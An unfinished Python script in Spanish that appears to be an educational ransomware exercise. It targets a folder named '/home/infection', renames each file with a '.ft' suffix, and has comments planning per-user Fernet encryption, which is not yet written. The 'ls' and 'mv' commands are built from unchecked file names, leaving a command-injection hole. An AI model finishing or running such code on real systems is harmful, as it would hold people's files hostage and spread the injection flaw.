# Realizado por Solo a 04/08/2022 última actualización 04/08/2022 WIP.


#--------------------------------------------------------------------------------------------------------
#-----------------------------------------LIBRERIAS------------------------------------------------------

import argparse
import os
from cryptography.fernet import Fernet

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------VARIABLES------------------------------------------------------

ruta = "/home/infection"
users = {}
user = os.popen('whoami').read()[:-1]

#--------------------------------------------------------------------------------------------------------
#-----------------------------------------FUNCIONES------------------------------------------------------

def listar_archivos(ruta):
    nombres = os.popen('ls ' + ruta).read()
    nombres
    archivos = nombres.strip('\n').split('\n')
    return archivos

# esto ya seria ejecucion creo
# listado de cosas a hacer:
#       - recoges usuario e IP(o algo similar) y anades al diccionario usuario/key
#       - recopilas los archivos en la lista
#       - codificas los archivos con la key del usuario
#--------------------------------------------------------------------------------------------------------
#-----------------------------------------EJECUCION------------------------------------------------------
archivos = listar_archivos(ruta)

for elem in archivos:
    if not elem.endswith('.ft'):
       os.system(f"mv {ruta}/{elem} {ruta}/{elem}.ft")